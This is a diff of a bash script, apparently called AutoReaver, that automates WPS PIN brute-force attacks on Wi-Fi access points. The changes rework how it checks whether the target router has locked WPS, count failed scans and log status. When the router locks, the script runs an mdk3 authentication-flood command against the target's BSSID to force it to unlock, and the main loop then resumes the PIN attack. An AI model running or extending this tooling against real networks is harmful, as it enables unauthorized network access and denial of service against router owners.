@@ -196,7 +196,6 @@ setAPSettings(){
 					RESCAN_AP=1;
 					setAPSettings;;
 				[Nn]* )
-					echoBlue "Exiting..."
 					exitAutoReaver;;
 				* )
 					echoOrange "Invalid Selection......";;
@@ -343,6 +342,7 @@ reaverConfig(){
 
 setAPStatus(){
 	local CHECK_AP_STATUS;
+	local WASH_ATTEMPT;
 
 	CHECK_AP_STATUS=$REAVER_TMP_DIR'/'$BSSID_CLEAR'.APStatus';
 
@@ -352,24 +352,38 @@ setAPStatus(){
 			echoGreen "AP Channel Changed To $AP_CHANNEL......";
 		fi
 
-	        case "$(cat $CHECK_AP_STATUS | awk --field-separator='_' '{ print $4 }')" in
-	                "LOCKED")
-	                        AP_LOCK="Yes";
-				echoRed "AP Is Locked......";;
-	                "UNLOCKED")
-	                        AP_LOCK="No";
-				echoGreen "AP Is Not Locked......";;
-	                "NOT-FOUND")
-	                        AP_LOCK="";
-				echoOrange "AP Not Found......";;
-	        esac
+		case "$(cat $CHECK_AP_STATUS | awk --field-separator='_' '{ print $4 }')" in
+			"LOCKED")
+				AP_LOCK="Yes";
+				echoRed "AP Is Locked......";
+				echo $(date +"%d/%m/%Y %H:%M:%S $(cat $CHECK_AP_STATUS)") >> $STATUS_FILE;
+				$(rm $CHECK_AP_STATUS);;
+			"UNLOCKED")
+				if [[ $(awk 'END {print $3}' $STATUS_FILE | grep -ic 'UNLOCKED') -eq 0 ]]; then
+					echoGreen "AP Is Not Locked......";
+					echo $(date +"%d/%m/%Y %H:%M:%S $(cat $CHECK_AP_STATUS)") >> $STATUS_FILE;
+				else
+					$(rm $CHECK_AP_STATUS);
+				fi
 
-		if [[ "$(awk 'END {print $3}' $STATUS_FILE | grep -ic 'MDK3_FLOOD_ATTACK')" -eq 1 ]]; then
-			echo $(date +"%d/%m/%Y %H:%M:%S $(cat $CHECK_AP_STATUS)") >> $STATUS_FILE;
-		else
-			echo $(date +"%d/%m/%Y %H:%M:%S $(cat $CHECK_AP_STATUS)") >> $STATUS_FILE;
-			$(rm $CHECK_AP_STATUS);
-		fi
+				AP_LOCK="No";;
+			"NOT-FOUND")
+				AP_LOCK="NULL";
+
+				if [[ $(awk 'END {print $3}' $STATUS_FILE | grep -ic 'NOT-FOUND') -eq 0 ]]; then
+					WASH_ATTEMPT=1;
+				else
+					WASH_ATTEMPT=$(($(awk 'END {print $3}' $STATUS_FILE | awk --field-separator='_' '{ print $5 }')+1));
+				fi
+
+				 if [[ $WASH_ATTEMPT -le $MAX_WASH_ATTEMPT ]]; then
+					echoOrange "AP Not Found......";
+					echo $(date +"%d/%m/%Y %H:%M:%S $(cat $CHECK_AP_STATUS)_$WASH_ATTEMPT") >> $STATUS_FILE;
+					checkAPStatus;
+				else
+					echoRed "AP Not Found......";
+				fi
+		esac
 	else
 		echoRed "Check AP Status File Missing......";
 	fi
@@ -379,13 +393,8 @@ checkAPStatus(){
 	local CMD_LOCK_STATUS;
 	local WASH_OUTPUT;
 	local CHECK_AP_STATUS;
-	local WASH_ATTEMPT;
 
 	echoBlue "Checking AP Status......";
-
-	if [[ ! -f $STATUS_FILE ]]; then
-		touch $STATUS_FILE;
-	fi
 
 	CHECK_AP_STATUS=$REAVER_TMP_DIR'/'$BSSID_CLEAR'.APStatus';
 
@@ -405,15 +414,10 @@ checkAPStatus(){
 
 				break;
 			else
-				WASH_ATTEMPT=$((WASH_ATTEMPT+1));
-				echo "AP_CHECK_STATUS_NOT-FOUND_$WASH_ATTEMPT" > $CHECK_AP_STATUS;
+				echo "AP_CHECK_STATUS_NOT-FOUND" > $CHECK_AP_STATUS;
 			fi
 		done
 	}
-
-	if [[ "$(awk 'END {print $3}' $STATUS_FILE | grep -ic 'AP_CHECK_STATUS_NOT-FOUND')" -eq 1 && $WASH_ATTEMPT -le $MAX_WASH_ATTEMPT ]]; then
-		checkAPStatus;
-	fi
 
 	setAPStatus;
 }
@@ -427,10 +431,6 @@ unlockAP(){
 	local COUNT=1;
 
 	echoOrange "Trying To Unlock AP......";
-
-	if [[ ! -f $STATUS_FILE ]]; then
-		touch $STATUS_FILE;
-	fi
 
 	CMD_MDK3="mdk3 $WIFI_CARD_MONITOR  a -a $AP_BSSID -m";
 	eval $CMD_MDK3 | {
@@ -464,6 +464,9 @@ unlockAP(){
 						checkAPStatus;
 
 						if [[ "$AP_LOCK" == "No" ]]; then
+							break;
+						elif [[ "$AP_LOCK" == "NULL" ]]; then
+							echoRed "AP Not Found......";
 							break;
 						fi
 
@@ -628,11 +631,9 @@ checkRequisites(){
 							done;;
 						[5]* )
 							echoRed "The Web Proxy Won't Let us Through......";
-							echoBlue "Exiting......";
 							exitAutoReaver;;
 						* )
 							echoOrange "The Network is Down or Very Slow......";
-							echoBlue "Exiting......";
 							exitAutoReaver;;
 					esac
 
@@ -830,21 +831,23 @@ while true; do
 		if [[ "$AP_LOCK" == "Yes" ]]; then
 			unlockAP;
 
-			if [[ "$AP_LOCK" == "Yes" ]]; then
+			if [[ "$AP_LOCK" == "Yes" || "$AP_LOCK" == "NULL" ]]; then
 				break;
 			fi
 		else
 			if [[ $REAVER_ATTEMPT_DELAY -eq 0 ]]; then
 				REAVER_ATTEMPT_DELAY=60;
+				echo $(date +"%d/%m/%Y %H:%M:%S REAVER_ATTEMPT_DELAY_INCREASED_$REAVER_ATTEMPT_DELAY") >> $STATUS_FILE;
 			else
 				REAVER_PIN_ATTEMPTS=1;
+				echo $(date +"%d/%m/%Y %H:%M:%S REAVER_PIN_ATTEMPTS_CHANGED_$REAVER_PIN_ATTEMPTS") >> $STATUS_FILE;
 
 				checkAPStatus;
 
 				if [[ "$AP_LOCK" == "Yes" ]]; then
 					unlockAP;
 
-					if [[ "$AP_LOCK" == "Yes" ]]; then
+					if [[ "$AP_LOCK" == "Yes"  || "$AP_LOCK" == "NULL" ]]; then
 						break;
 					fi
 				fi
